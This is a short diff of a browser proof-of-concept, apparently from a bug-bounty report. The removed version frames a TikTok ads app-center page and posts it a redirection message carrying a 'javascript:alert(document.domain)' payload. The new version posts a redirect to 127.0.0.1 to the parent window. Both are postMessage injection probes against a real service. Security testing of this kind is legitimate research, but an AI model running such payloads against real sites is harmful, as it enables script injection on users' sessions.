@@ -1,9 +1,6 @@
-<iframe src="https://ads.tiktok.com/app-center/test/apps/7452174647644241921" id="targetFrame"></iframe>
 <script>
-document.getElementById('targetFrame').onload = function() {
-    this.contentWindow.postMessage({
-        action: "requestRedirectionTo",
-        targetUrlStr: "javascript:alert(document.domain)"
-    }, "*");
-};
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "http://127.0.0.1"
+}, "*");
 </script>
